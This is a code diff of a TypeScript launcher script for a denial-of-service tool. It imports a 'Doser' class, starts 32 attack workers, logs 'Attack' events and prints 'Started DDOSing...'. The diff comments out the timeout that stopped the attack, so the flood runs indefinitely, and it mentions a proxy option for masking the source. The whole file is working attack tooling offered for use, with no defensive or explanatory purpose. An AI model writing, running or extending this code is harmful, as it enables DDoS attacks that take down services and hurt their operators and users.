@@ -1,33 +1,29 @@
 import {Doser} from "./doser";
 
 // Tutorial: https://khalilstemmler.com/blogs/typescript/node-starter-project/
+// https://blog.appsignal.com/2022/01/19/how-to-set-up-a-nodejs-project-with-typescript.html
 
-const args = process.argv;
-console.log('Script started: ', args);
+// const args = process.argv;
+// console.log('Script started: ', args);
 let timeout = undefined;
 
 function start() {
   const doser = new Doser(true, 32)
-  doser.listen('atack', (data) => console.log(data.log))
-  doser.listen('error', (data) => console.log(data.log))
-
-  //Load targets
-  doser.loadHostsFile().then(() => {
-    doser.start()
-  }).catch(() => {
-    console.log('Error occurred while loading targets')
-  })
-
+  doser.listen('atack', (data) => console.log("Attack: ", data.log))
+  doser.listen('error', (data) => console.log("Error: ", data.log))
 
   // doser.forceProxy(true); // Use proxy to save the server
   // doser.setWorkersCount(32); // Count of workers
+  console.log('Started DDOSing...')
   doser.start(); //Start DDOSing
 
 
-  //Turn this script off after some time
-  timeout = setTimeout(() => {
-    doser.stop()
-  }, 5000)
+  // Turn this script off after some time
+  // If this is commented out then script will work forever
+  // timeout = setTimeout(() => {
+  //   doser.stop();
+  //   console.log('Stopped DDOSing...')
+  // }, 15000)
 }
 
 start();
